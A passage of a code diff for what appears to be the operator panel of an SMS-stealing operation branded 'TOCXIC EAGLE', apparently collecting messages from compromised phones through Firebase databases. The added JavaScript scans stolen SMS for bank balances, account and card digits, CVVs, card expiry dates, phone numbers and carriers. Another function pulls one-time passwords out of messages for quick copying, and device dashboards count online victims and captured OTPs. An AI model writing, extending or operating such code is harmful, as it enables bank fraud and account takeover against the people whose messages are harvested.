+const BANK_PATTERNS = [/HDFCB|HDFC/i,/SBIIN|SBI/i,/ICICIB|ICICI/i,/AXISBK|AXIS/i,
+  /KOTAKB|KOTAK/i,/PNBSMS|PNB/i,/BOIIND|BOI/i,/CANBNK|CANARA/i,/UNIONB/i,
+  /YESBNK/i,/IDBIBK|IDBI/i,/INDUSB/i,/FEDERAL/i,/RBLBNK/i,/PAYTM/i,/PHONEPE/i,/GPAY/i,/BAJAJFIN/i];
+const BANK_NAMES = ["HDFC Bank","SBI","ICICI Bank","Axis Bank","Kotak Bank","PNB",
+  "Bank of India","Canara Bank","Union Bank","Yes Bank","IDBI Bank","IndusInd Bank",
+  "Federal Bank","RBL Bank","Paytm","PhonePe","Google Pay","Bajaj Finance"];
+const BAL_RX = [
+  /Aval(?:\.|\s)Bal(?:\.|\s)(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /Avl(?:\.|\s)Bal(?:\.|\s)(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /Available\s+Bal\w*\s*:?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
+  /Bal(?:ance)?\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{2})?)/i];
+const AMT_RX = [/(?:debited|credited|withdrawn).*?(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited)/i];
+const ACCT_RX = [/(?:A\/C|acct)[\sxX*:]+([xX*0-9]{0,4}[0-9]{4})/i,
+  /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i];
+const CARD_RX = [/(?:card)[\sxX*:]+([xX*]{0,8}[0-9]{4})/i, /ending\s*([0-9]{4})/i];
+const CVV_RX = [/CVV[\s:]+([0-9]{3,4})/i];
+const EXP_RX = [/(?:expiry|exp|valid thru?)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
+const PHONE_RX = [/(?:mobile|mob|phone|contact)\s+(?:no\.?|number)?\s*:?\s*([6-9][0-9]{9})/i,
+  /Number\s*:\s*([6-9][0-9]{9})/i, /(\+?91[-\s]?[6-9][0-9]{9})/,
+  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/];
+const NET_PATTERNS = [[/Jio\s+Number|JIO/i,"Jio"],[/Airtel/i,"Airtel"],[/BSNL/i,"BSNL"],
+  [/Vodafone|Vi-/i,"Vodafone"],[/Idea/i,"Vi (Idea)"]];
+
+function matchFirst(text, arr) {
+  for (const rx of arr) { const m = text.match(rx); if (m && m[1]) return m[1].replace(/,/g, ""); }
+  return null;
+}
+function isBankSms(text, sender) {
+  return /AVL|AVAL|AVBL|BALANCE|BAL\.|CREDITED|DEBITED|INR/.test(text.toUpperCase()) &&
+    (BANK_PATTERNS.some(p => p.test(sender)) || /debited|credited|balance/i.test(text));
+}
+function isCardSms(text) { return /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(text); }
+function getPhone(text) {
+  for (const rx of PHONE_RX) {
+    const m = text.match(rx);
+    if (m) {
+      const d = (m[1] || m[0]).replace(/[^0-9]/g, "");
+      if (d.length === 10 && /^[6-9]/.test(d)) return d;
+      if (d.length === 12 && d.startsWith("91")) return d.slice(2);
+    }
+  }
+  return null;
+}
+function getNetwork(text, sender) {
+  for (const [rx, name] of NET_PATTERNS) if (rx.test(text + " " + sender)) return name;
+  return null;
+}
+function getBankName(sender) {
+  for (let i = 0; i < BANK_PATTERNS.length; i++) if (BANK_PATTERNS[i].test(sender)) return BANK_NAMES[i];
+  return sender || "Bank";
+}
+function analyzeSms(msgs) {
+  const bankBalances = [], cards = [], phones = new Set(), networks = new Set();
+  for (const m of msgs) {
+    const txt = m.text || "", snd = m.sender || "";
+    if (isBankSms(txt, snd)) {
+      const bal = matchFirst(txt, BAL_RX);
+      if (bal) {
+        const amt = matchFirst(txt, AMT_RX);
+        const acct = (() => {
+          for (const rx of ACCT_RX) { const r = txt.match(rx); if (r && r[1]) return r[1].replace(/[^0-9]/g,"").slice(-4); }
+          return null;
+        })();
+        const type = /credit/i.test(txt) ? "credit" : /debit|withdraw|paid|purchase/i.test(txt) ? "debit" : null;
+        const ph = getPhone(txt), net = getNetwork(txt, snd);
+        bankBalances.push({
+          bankName: getBankName(snd), senderName: snd, availableBalance: bal,
+          transactionAmount: amt && amt !== bal ? amt : null, transactionType: type,
+          accountLast4: acct, phoneFromSms: ph, networkFromSms: net,
+          rawSms: txt.substring(0, 300), detectedAt: m.time || "",
+        });
+        if (ph) phones.add(ph); if (net) networks.add(net);
+      }
+    }
+    if (isCardSms(txt)) {
+      const last4 = (() => {
+        for (const rx of CARD_RX) {
+          const r = txt.match(rx);
+          if (r && r[1]) { const d = r[1].replace(/[^0-9]/g,""); if (d.length >= 4) return d.slice(-4); }
+        }
+        return null;
+      })();
+      if (last4) {
+        const ct = /VISA/i.test(txt) ? "VISA" : /MASTER/i.test(txt) ? "Mastercard"
+          : /RUPAY/i.test(txt) ? "RuPay" : /AMEX/i.test(txt) ? "Amex" : "Card";
+        cards.push({ cardLast4: last4, cardType: ct,
+          cvv: matchFirst(txt, CVV_RX) || null, expiry: matchFirst(txt, EXP_RX) || null,
+          rawSms: txt.substring(0, 200) });
+      }
+    }
+    const ph = getPhone(txt), net = getNetwork(txt, snd);
+    if (ph) phones.add(ph); if (net) networks.add(net);
+  }
+  return { bankBalances, cards, phoneNumbers: [...phones], networks: [...networks] };
 }
 
-checkConn(); loadNumbers();
-setInterval(checkConn, 8000);
-setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
+/* ═══ UTILS ═══ */
+function timeAgo(ms) {
+  const d = Date.now() - ms, s = Math.floor(d/1000), m = Math.floor(s/60),
+    h = Math.floor(m/60), dy = Math.floor(h/24);
+  if (s < 60) return s + "s ago";
+  if (m < 60) return m + "m ago";
+  if (h < 24) return h + "h " + (m % 60) + "m ago";
+  if (dy < 30) return dy + "d " + (h % 24) + "h ago";
+  return new Date(ms).toLocaleDateString();
+}
+function fmtBal(v) {
+  try { return parseFloat(v).toLocaleString("en-IN", { minimumFractionDigits:2, maximumFractionDigits:2 }); }
+  catch { return v; }
+}
+function batHtml(pct) {
+  const col = pct >= 60 ? "var(--green)" : pct >= 30 ? "var(--amber)" : "var(--red2)";
+  return `<span style="display:inline-flex;align-items:center;gap:5px">
+    <span style="width:26px;height:12px;border:1px solid #555;border-radius:3px;padding:2px;display:inline-flex">
+      <span style="height:100%;width:${Math.max(5, pct)}%;background:${col};border-radius:1.5px"></span>
+    </span>
+    <span style="font-size:11px;font-weight:700;color:${col}">${pct}%</span>
+  </span>`;
+}
+function escHtml(s) {
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+function extractOtp(text) {
+  if (!text) return "";
+  const t = String(text);
+  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
+  if (m) return m[1];
+  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
+  if (m) return m[1];
+  m = t.match(/#(\d{4,8})/);
+  if (m) return m[1];
+  return "";
+}
+function copyOtp(c) {
+  const done = () => showToast("✅ Copied: " + c);
+  if (navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(() => {
+    const ta = document.createElement("textarea"); ta.value = c; document.body.appendChild(ta);
+    ta.select(); document.execCommand("copy"); ta.remove(); done();
+  });
+}
+window.copyOtp = copyOtp;
+
+async function refreshAll() {
+  showToast("🔄 Refreshing...");
+  try { await fetch("/api/refresh", { method: "POST" }); } catch(e) {}
+  smsCache = {}; smsAnalysisCache = {};
+  await loadDevices();
+  showToast("✅ Refreshed");
+}
+
+boot();
 </script>
 </body></html>"""
 
+USER_NAV = """<a href="/user" class="nav-link active">📱 Numbers</a>
+<a href="/otp" class="nav-link green">🔐 Personal OTP</a>
+<a href="/" class="nav-link">🏠 Home</a>"""
 
-# ============================================================
-# SECURITY PAGE
-# ============================================================
-SECURITY_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Security — TOCXIC EAGLE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """
-.card-sec{background:var(--card);border-radius:18px;padding:20px;margin-bottom:14px;
-border:1px solid var(--sep)}
-.card-sec h3{font-size:14px;color:#344054;margin-bottom:6px;font-weight:800;
-font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
-.card-sec p.desc{font-size:12px;color:var(--muted);margin-bottom:16px}
-.field{margin-bottom:14px}
-.field label{display:block;font-size:12px;color:var(--muted);font-weight:700;margin-bottom:6px}
-.pwd-wrap{position:relative}
-.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:12px;
-border:1.5px solid var(--sep);background:#f9fafb;outline:none;color:var(--text);transition:.2s}
-.pwd-wrap input:focus{border-color:#0F3CC9;background:#fff;
-box-shadow:0 0 0 4px rgba(15,60,201,.12)}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
-cursor:pointer;font-size:18px;color:var(--muted2);padding:4px}
-.btn{display:block;padding:14px 20px;border:none;border-radius:12px;font-weight:800;font-size:13px;
-width:100%;min-height:50px;font-family:inherit;cursor:pointer}
-.btn.warning{background:linear-gradient(135deg,#E40000,#FF4D4D);color:#fff}
-.msg{margin-top:12px;padding:12px 14px;border-radius:12px;font-size:13px;
-display:none;text-align:center;font-weight:700}
-.msg.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
-.msg.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
-</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">SECURITY</span></div></div>
-<div class="nav">
-<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
+ADMIN_NAV = """<a href="/admin/dashboard" class="nav-link active">📱 Numbers</a>
 <a href="/firebases" class="nav-link">🔥 Firebases</a>
-<a href="/admin/security" class="nav-link sec active">🔒 Security</a>
-</div>
-<a href="/logout" class="nav-link">Logout</a>
-</div>
+<a href="/admin/security" class="nav-link">🔒 Security</a>
+<a href="/logout" class="nav-link">Logout</a>"""
 
-<div class="container">
-<div class="card-sec">
-<h3>👑 Change Admin Password</h3>
-<p class="desc">Ye password admin panel login ke liye. MongoDB me permanent save hoga.</p>
-<div class="field">
-<label>New Admin Password</label>
-<div class="pwd-wrap">
-<input type="password" id="admin-pwd" placeholder="Enter new admin password">
-<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁️</span>
-</div>
-</div>
-<button class="btn warning" onclick="changeAdminPwd()">Update Admin Password</button>
-<div class="msg" id="admin-msg"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }
-function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target;
-if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; }
-else { i.type = 'password'; t.textContent = '👁️'; } }
-function showMsg(id, t, type){ const e = document.getElementById(id);
-e.className = 'msg ' + type; e.textContent = t;
-if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
-async function changeAdminPwd(){
-const pwd = document.getElementById('admin-pwd').value.trim();
-if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ Min 4 chars', 'err'); return; }
-const r = await fetch('/api/security/change', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({role:'admin', password: pwd}) });
-const d = await r.json();
-if(d.success){ showMsg('admin-msg', '✅ Admin password saved!', 'ok');
-document.getElementById('admin-pwd').value = ''; toast('✅ Changed'); }
-else showMsg('admin-msg', '❌ ' + (d.error||'Error'), 'err'); }
-</script>
-</body></html>"""
+BC_FAB = """<button class="bc-fab" onclick="openBroadcastModal()" title="Broadcast Mail">
+  📧<span class="count-badge" id="bc-count-badge" style="display:none">0</span>
+</button>"""
 
 
-# ============================================================
-# FIREBASES PAGE
-# ============================================================
-FIREBASES_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Firebases — TOCXIC EAGLE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """
-.card-fb{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;
-border:1px solid var(--sep)}
-.card-fb h3{font-size:13px;color:#344054;margin-bottom:14px;font-weight:800;
-font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase;
-display:flex;align-items:center;gap:8px}
-.add-row{display:flex;gap:8px;flex-wrap:wrap}
-.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
-border:1px solid var(--sep);background:#f9fafb;font-size:14px;outline:none;color:var(--text)}
-.add-row input:focus{border-color:#0F3CC9;box-shadow:0 0 0 4px rgba(15,60,201,.12);background:#fff}
-.card-fb button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;
-font-size:12px;font-family:inherit;min-height:50px;cursor:pointer}
-.card-fb button.primary{background:var(--grad-b);color:#fff}
-.card-fb button.gray{background:rgba(16,24,40,.08);color:#344054}
-.card-fb button.danger{background:rgba(240,68,56,.1);color:#b42318}
-.card-fb button.danger-solid{background:var(--grad-r);color:#fff}
-.card-fb button.green{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
-.bulk-area{margin-top:12px;display:none}
-.bulk-area textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--sep);
-background:#f9fafb;font-size:13px;min-height:140px;font-family:monospace;outline:none;
-color:var(--text);resize:vertical}
-.bulk-area textarea:focus{border-color:#0F3CC9;background:#fff}
-.bulk-area button{margin-top:10px}
-.msg-fb{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;
-display:none;font-weight:700}
-.msg-fb.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
-.msg-fb.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
-.fb-header{display:flex;justify-content:space-between;align-items:center;
-margin-bottom:14px;flex-wrap:wrap;gap:10px}
-.fb-header h2{font-size:14px;font-weight:800;color:#344054;
-font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase;
-display:flex;align-items:center;gap:8px}
-.fb-header .cnt{background:rgba(16,24,40,.08);color:#344054;padding:4px 12px;
-border-radius:20px;font-size:11px;font-family:'Orbitron',sans-serif;font-weight:800}
-.fb-header .actions{display:flex;gap:8px;flex-wrap:wrap}
-.fb-header .actions button{padding:10px 14px;font-size:12px}
-.fb-list{display:grid;gap:10px}
-.fb-card{background:var(--card);border-radius:16px;padding:16px;display:flex;
-align-items:center;gap:14px;border:1px solid var(--sep);flex-wrap:wrap}
-.fb-icon{width:48px;height:48px;border-radius:14px;
-background:linear-gradient(135deg,#fef3c7,#fde68a);display:flex;align-items:center;
-justify-content:center;font-size:22px;flex-shrink:0}
-.fb-info{flex:1;min-width:0;cursor:pointer}
-.fb-name{font-size:14px;font-weight:800;color:var(--text);overflow:hidden;
-text-overflow:ellipsis;white-space:nowrap;font-family:'Orbitron',sans-serif;
-display:flex;align-items:center;gap:6px;flex-wrap:wrap}
-.fb-hash{font-size:11px;color:var(--muted2);margin-top:4px;font-family:monospace;word-break:break-all}
-.fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
-.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;
-font-weight:800;padding:3px 8px;border-radius:8px}
-.fb-count-pill.online{background:rgba(18,183,106,.15);color:#05603a}
-.fb-count-pill.offline{background:rgba(240,68,56,.12);color:#b42318}
-.fb-count-pill.devices{background:rgba(15,60,201,.1);color:#0F3CC9}
-.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
-.fb-actions{display:flex;gap:6px;flex-shrink:0}
-.fb-actions button{padding:10px 12px;font-size:12px}
-.checkbox{width:24px;height:24px;border:2px solid rgba(16,24,40,.2);border-radius:8px;
-display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;
-background:#fff;color:#fff;font-size:14px;font-weight:800}
-.checkbox.checked{background:var(--grad-b);border-color:transparent}
-.select-all{display:flex;align-items:center;gap:12px;padding:14px 16px;
-background:rgba(16,24,40,.05);border-radius:12px;margin-bottom:12px;font-size:13px;
-font-weight:800;color:#344054;cursor:pointer}
-.empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px;
-background:var(--card);border-radius:18px;border:1px solid var(--sep)}
-.loading-text{text-align:center;padding:28px;color:var(--muted);font-size:13px;
-background:var(--card);border-radius:18px;margin-bottom:16px;border:1px solid var(--sep)}
-</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">FIREBASES</span></div></div>
-<div class="nav">
-<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
-<a href="/firebases" class="nav-link active">🔥 Firebases</a>
-<a href="/admin/security" class="nav-link sec">🔒 Security</a>
-</div>
-<div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-</div>
-
-<div class="container">
-<div class="card-fb">
-<h3>➕ Add Firebase URL</h3>
-<div class="add-row">
-<input id="fb-url" placeholder="https://xxx.firebaseio.com"
-onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" onclick="addFirebase()">Add</button>
-<button class="gray" onclick="toggleBulk()">Bulk</button>
-</div>
-<div id="bulk-area" class="bulk-area">
-<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button class="green" onclick="bulkAdd()">📥 Import All</button>
-</div>
-<div id="fb-msg" class="msg-fb"></div>
-</div>
-
-<div class="card-fb">
-<div class="fb-header">
-<h2>🔥 Firebases <span class="cnt" id="fb-count">0</span></h2>
-<div class="actions">
-<button class="danger" onclick="removeSelected()">🗑 Sel</button>
-<button class="danger-solid" onclick="removeAll()">🗑 All</button>
-</div>
-</div>
-<div class="select-all" onclick="toggleSelectAll()">
-<div class="checkbox" id="select-all-cb"></div><span>Select All</span>
-</div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span>Loading...</div>
-<div id="fb-list" class="fb-list"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-let firebases = [], selected = new Set();
-
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
-
-async function checkConn(){
-try{ const r = await fetch('/api/conn'); const d = await r.json();
-const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
-if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
-else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }
-
-function toggleBulk(){ const a = document.getElementById('bulk-area');
-a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
-
-async function addFirebase(){
-const url = document.getElementById('fb-url').value.trim();
-if(!url) return showMsg('URL required','err');
-try{ const r = await fetch('/api/firebases', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
-const d = await r.json();
-if(d.success){ showMsg('✅ Added','ok');
-document.getElementById('fb-url').value = ''; loadFirebases(); }
-else showMsg('❌ ' + (d.error||'Error'),'err'); }
-catch(e){ showMsg('❌ Network error','err'); } }
-
-async function bulkAdd(){
-const txt = document.getElementById('fb-bulk').value.trim();
-if(!txt) return showMsg('Empty','err');
-const urls = txt.split('\\n').map(l => l.trim()).filter(l => l.startsWith('http'));
-if(!urls.length) return showMsg('No valid URLs','err');
-showMsg('⏳ Adding ' + urls.length + '...','ok');
-try{ const r = await fetch('/api/firebases/bulk', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls}) });
-const d = await r.json();
-if(d.success){ showMsg('✅ Added: ' + d.added + ', Skip: ' + d.skipped,'ok');
-document.getElementById('fb-bulk').value = '';
-document.getElementById('bulk-area').style.display = 'none'; loadFirebases(); }
-else showMsg('❌ ' + (d.error||'Error'),'err'); }
-catch(e){ showMsg('❌ Network error','err'); } }
-
-function showMsg(t, type){ const e = document.getElementById('fb-msg');
-e.className = 'msg-fb ' + type; e.textContent = t;
-if(type === 'ok') setTimeout(()=>{ e.className = 'msg-fb'; }, 3000); }
-
-async function loadFirebases(){
-document.getElementById('loading-text').style.display = 'block';
-try{ const r = await fetch('/api/firebases'); const d = await r.json();
-if(!d.success){ document.getElementById('loading-text').textContent = '❌ ' + (d.error||'Error'); return; }
-firebases = d.firebases || [];
-document.getElementById('fb-count').textContent = firebases.length;
-document.getElementById('loading-text').style.display = 'none';
-renderFbs(); updateSelectAll(); }
-catch(e){ document.getElementById('loading-text').textContent = '❌ Network error'; } }
-
-function renderFbs(){
-const box = document.getElementById('fb-list');
-if(firebases.length === 0){ box.innerHTML = '<div class="empty">🦅 No firebase yet</div>'; return; }
-box.innerHTML = firebases.map(f => {
-const isSel = selected.has(f.id);
-const badge = f.source === 'personal_otp'
-? '<span style="background:rgba(18,183,106,.15);color:#065f46;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:800">👤 USER</span>'
-: '<span style="background:rgba(15,60,201,.1);color:#0F3CC9;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:800">👑 ADMIN</span>';
-const stats = f.stats || {online: 0, offline: 0, devices: 0};
-return '<div class="fb-card">' +
-'<div class="checkbox ' + (isSel?'checked':'') + '" onclick="event.stopPropagation();toggleSelect(\\'' + f.id + '\\')">' + (isSel?'✓':'') + '</div>' +
-'<div class="fb-icon">🔥</div>' +
-'<div class="fb-info" onclick="openFb(\\'' + f.id + '\\')">' +
-'<div class="fb-name">' + escapeHtml(f.name||'unnamed') + badge + '</div>' +
-'<div class="fb-hash">🔒 ID: ' + escapeHtml(f.hash||'hidden') + '</div>' +
-'<div class="fb-counts">' +
-'<span class="fb-count-pill online"><span class="dot"></span>' + stats.online + ' Online</span>' +
-'<span class="fb-count-pill offline"><span class="dot"></span>' + stats.offline + ' Offline</span>' +
-'<span class="fb-count-pill devices">📱 ' + stats.devices + ' Devices</span>' +
-'</div></div>' +
-'<div class="fb-actions">' +
-'<button class="primary" onclick="event.stopPropagation();openFb(\\'' + f.id + '\\')">Open</button>' +
-'<button class="danger" onclick="event.stopPropagation();removeOne(\\'' + f.id + '\\')">🗑</button>' +
-'</div></div>'; }).join(''); }
-
-function openFb(id){ window.location.href = '/firebase/' + id; }
-function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id);
-renderFbs(); updateSelectAll(); }
-function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear();
-else selected = new Set(firebases.map(f => f.id));
-renderFbs(); updateSelectAll(); }
-function updateSelectAll(){ const cb = document.getElementById('select-all-cb');
-if(firebases.length > 0 && selected.size === firebases.length){
-cb.classList.add('checked'); cb.textContent = '✓'; }
-else { cb.classList.remove('checked'); cb.textContent = ''; } }
-
-async function removeOne(id){
-if(!confirm('Delete this firebase?')) return;
-const r = await fetch('/api/firebases/' + id, { method:'DELETE' }); const d = await r.json();
-if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
-else toast('❌ ' + (d.error||'Error')); }
-
-async function removeSelected(){
-if(selected.size === 0) return toast('❌ Select at least one');
-if(!confirm('Delete ' + selected.size + ' firebase(s)?')) return;
-const ids = Array.from(selected);
-const r = await fetch('/api/firebases/bulk-delete', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids}) });
-const d = await r.json();
-if(d.success){ toast('✅ Deleted: ' + d.deleted); selected.clear(); loadFirebases(); }
-else toast('❌ ' + (d.error||'Error')); }
-
-async function removeAll(){
-if(firebases.length === 0) return toast('❌ No firebases');
-if(!confirm('Delete ALL ' + firebases.length + '?')) return;
-const r = await fetch('/api/firebases/all', { method:'DELETE' }); const d = await r.json();
-if(d.success){ toast('✅ Deleted all: ' + d.deleted); selected.clear(); loadFirebases(); }
-else toast('❌ ' + (d.error||'Error')); }
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-checkConn(); loadFirebases();
-setInterval(checkConn, 10000);
-setInterval(loadFirebases, 20000);
-</script>
-</body></html>"""
-
-
-# ============================================================
-# FIREBASE VIEW PAGE
-# ============================================================
-FIREBASE_VIEW_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Firebase — TOCXIC EAGLE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """
-.hero{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;border:1px solid var(--sep)}
-.hero h1{font-size:16px;font-weight:800;color:var(--text);margin-bottom:6px;
-display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-family:'Orbitron',sans-serif}
-.hero .hash{font-size:11px;color:var(--muted2);font-family:monospace;margin-bottom:14px}
-.hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
-.hs{background:#f8fafc;border-radius:12px;padding:12px;text-align:center}
-.hs b{display:block;font-size:22px;font-weight:800;color:#0F3CC9;margin-bottom:2px;
-font-family:'Orbitron',sans-serif}
-.hs span{font-size:10px;color:var(--muted2);text-transform:uppercase;font-weight:800;
-letter-spacing:.5px;font-family:'Orbitron',sans-serif}
-.hs.online b{color:#12b76a}
-.hs.offline b{color:#E40000}
-.hs.otp b{color:#7c3aed}
-</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">FIREBASE</span></div></div>
-<div class="nav">
-<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
-<a href="/firebases" class="nav-link active">🔥 Firebases</a>
-<a href="/admin/security" class="nav-link sec">🔒</a>
-</div>
-<div style="display:flex;align-items:center;gap:10px">
-<button id="top-num-btn" onclick="showTopNum()" style="display:none; background:linear-gradient(135deg,#fbbf24,#f59e0b); color:#fff; border:none; width:42px; height:42px; border-radius:50%; font-size:18px; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(251,191,36,0.4);">📞</button>
-<a href="/logout" class="nav-link">Logout</a>
-</div>
-</div>
-
-<div class="container">
-<div class="hero">
-<h1>🔥 <span id="fb-name">Loading...</span></h1>
-<div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
-<div class="hero-stats">
-<div class="hs"><b id="h-dev">0</b><span>Devices</span></div>
-<div class="hs online"><b id="h-on">0</b><span>Online</span></div>
-<div class="hs offline"><b id="h-off">0</b><span>Offline</span></div>
-<div class="hs otp"><b id="h-otp">0</b><span>OTPs</span></div>
-</div>
-</div>
-
-<div id="list-view">
-<div class="loading-text" id="loading-text"><span class="spinner"></span>Loading...</div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
-<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
-<div id="num-list"></div>
-</div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top">
-<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
-<div style="flex:1">
-<div class="inbox-num" id="inbox-num">+91 ------</div>
-<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
-</div>
-</div>
-<div class="inbox-meta">
-<span>⚡ auto 1s · Latest 10 SMS</span>
-<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
-</div>
-<div class="mail-tab-bar" style="margin-top:14px">
-<button class="mail-tab-btn active" id="mt-sms" onclick="setMailTab('sms')">🛜 SMS</button>
-<button class="mail-tab-btn" id="mt-mail" onclick="setMailTab('mail')">📧 Broadcast Mail</button>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-const FB_ID = "{{FB_ID}}";
-let numbers = [], currentNum = null, refreshTimer = null, lastInboxSig = '';
-let currentTopNumber = null;
-let currentMailTab = 'sms';
-let allBroadcasts = [];
-
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 1800); }
-
-async function loadFirebase(){
-try{ const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
-if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'Error'); return; }
-document.getElementById('fb-name').textContent = d.name || 'unnamed';
-document.getElementById('fb-hash').textContent = d.hash || 'hidden';
-document.getElementById('h-dev').textContent = d.device_count;
-document.getElementById('h-on').textContent = d.online_count;
-document.getElementById('h-off').textContent = d.offline_count || 0;
-document.getElementById('h-otp').textContent = d.otp_count;
-numbers = d.numbers || [];
-document.getElementById('num-count').textContent = numbers.length;
-document.getElementById('loading-text').classList.add('hidden');
-document.getElementById('list-content').classList.remove('hidden');
-renderNumbers();
-}catch(e){ document.getElementById('loading-text').innerHTML = '❌ Network error'; } }
-
-function renderNumbers(){
-const q = (document.getElementById('search-num').value || '').toLowerCase();
-const box = document.getElementById('num-list');
